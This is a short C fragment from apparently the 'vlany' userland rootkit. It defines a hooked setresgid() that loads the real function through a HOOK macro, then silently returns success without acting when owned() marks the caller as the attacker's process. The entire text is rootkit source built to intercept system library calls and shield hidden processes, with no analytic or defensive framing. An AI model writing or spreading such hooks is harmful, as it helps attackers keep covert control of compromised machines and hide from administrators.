int setresgid(gid_t rgid, gid_t egid, gid_t sgid)
{
    #ifdef DEBUG
        printf("[vlany] setresgid() called\n");
    #endif

    HOOK(old_setresgid, CSETRESGID);

    if(owned()) return 0;

    return old_setresgid(rgid, egid, sgid);
}
